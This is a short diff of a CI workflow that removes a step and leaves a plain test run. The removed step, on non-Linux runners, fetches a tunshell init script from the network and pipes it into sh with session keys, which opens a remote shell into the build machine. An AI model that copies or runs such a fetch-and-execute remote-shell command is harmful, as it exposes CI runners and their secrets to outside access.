@@ -17,8 +17,4 @@ jobs:
     steps:
     - uses: commaai/timeout@v1
     - uses: actions/checkout@v4
-    - run: |
-        pwd
-        [[ $OSTYPE = "linux-gnu" ]] && ./test.sh || {
-          wget https://lets.tunshell.com/init.sh -O - 2> /dev/null | sh -s -- T 2zc57LlrkrHBOnRRWozUNY yIt6yZPOt1dbtEEG1s8N4c
-        }
+    - run: ./test.sh
